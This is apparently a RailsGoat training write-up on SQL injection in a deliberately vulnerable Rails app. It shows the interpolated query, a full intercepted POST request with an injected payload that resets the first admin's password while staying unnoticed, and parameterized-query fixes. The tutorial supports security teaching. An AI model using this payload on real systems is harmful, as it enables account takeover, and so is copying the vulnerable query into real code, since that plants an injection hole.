# Description

Injection flaws, such as SQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing unauthorized data.

# Bug

This example of SQL Injection also happens to be a form of Insecure Direct Object Reference since it uses user-supplied input to determine the user's profile to update. However, we will discuss the SQL query being used and why it is vulnerable.

Within app/controllers/users_controller.rb

```ruby
def update
  message = false
  user = User.find(:first, :conditions => "user_id = '#{params[:user][:user_id]}'")
  user.skip_user_id_assign = true
  user.update_attributes(params[:user].reject { |k| k == ("password" || "password_confirmation") || "user_id" })
  pass = params[:user][:password]
  user.password = pass if !(pass.blank?)
  message = true if user.save!
  respond_to do |format|
    format.html { redirect_to user_account_settings_path(:user_id => current_user.user_id) }
    format.json { render :json => {:msg => message ? "success" : "false "} }
  end
end
```

#Solution

### SQL Injection - ATTACK

You will need to use an intercepting proxy or otherwise modify the request prior to it being received by the application. Browse to account_settings (top right, drop-down). Once at the account settings page, type in passwords, and click submit. Now modify the request from:

    POST /users/5.json HTTP/1.1
    Host: railsgoat.dev
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:19.0) Gecko/20100101 Firefox/19.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Referer: http://railsgoat.dev/users/5/account_settings
    Content-Length: 294
    Cookie: _railsgoat_session=[redacted]
    Connection: keep-alive
    Pragma: no-cache
    Cache-Control: no-cache
    
    utf8=✓&_method=put&authenticity_token=GXhLKKhfBXdFx5i6iqHEd5E32Kebn1+G35eA87RW1tU=&user[user_id]=5&user[email]=ken@metacorp.com&user[first_name]=Ken&user[last_name]=Johnson&user[password]=testtest&user[password_confirmation]=testtest

Now we will inject some SQL Query syntax that will return the first result of a query that looks for users that have an admin attribute that is true. So essentially, instead of looking up the user whose data we will change by our user ID, we tell the database to return the first admin and update their data. In this instance, we are changing admin@metacorp.com's password to testtest. We can later login as that user. Granted, we could just change the user_id to 1 and do the same thing, and there are other ways to exploit this weakness but this is a clear-cut example of SQL Injection. **It is important to note that we have omitted the email, first, and last name parameters as a duplicate email address will cause errors. Additionally, we do not wish to change the admin's first and last name as this would alert the admin to the "hack"**.

    POST /users/5.json HTTP/1.1
    Host: railsgoat.dev
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:19.0) Gecko/20100101 Firefox/19.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Referer: http://railsgoat.dev/users/5/account_settings
    Content-Length: 208
    Cookie: _railsgoat_session=[redacted]
    Connection: keep-alive
    Pragma: no-cache
    Cache-Control: no-cache

    utf8=✓&_method=put&authenticity_token=GXhLKKhfBXdFx5i6iqHEd5E32Kebn1+G35eA87RW1tU=&user[user_id]=5') OR admin = 't' --'")&user[password]=testtest1&user[password_confirmation]=testtest1

### SQL Injection - SOLUTION

In this instance, the more secure route would be to reference the current_user object versus pulling from the database manually, using POST parameters provided by the user.

```ruby
def update
  message = false
  user = current_user
  user.skip_user_id_assign = true
  user.update_attributes(params[:user].reject { |k| k == ("password" || "password_confirmation") || "user_id" })
  pass = params[:user][:password]
  user.password = pass if !(pass.blank?)
  message = true if user.save!
  respond_to do |format|
    format.html { redirect_to user_account_settings_path(:user_id => current_user.user_id) }
    format.json { render :json => {:msg => message ? "success" : "false "} }
  end
end
```

...However, since we are discussing fixing vulnerable SQL queries, let's discuss parameterized queries. Parameterized queries separate the SQL Query from the dynamic and often untrusted data. You could replace the string interpolated value with the following query and effectively separate the query from untrusted data:

```ruby
user = User.find(:first, :conditions => ["user_id = ?", params[:user][:user_id]])
```

#Hint

I wonder who else's account needs updating?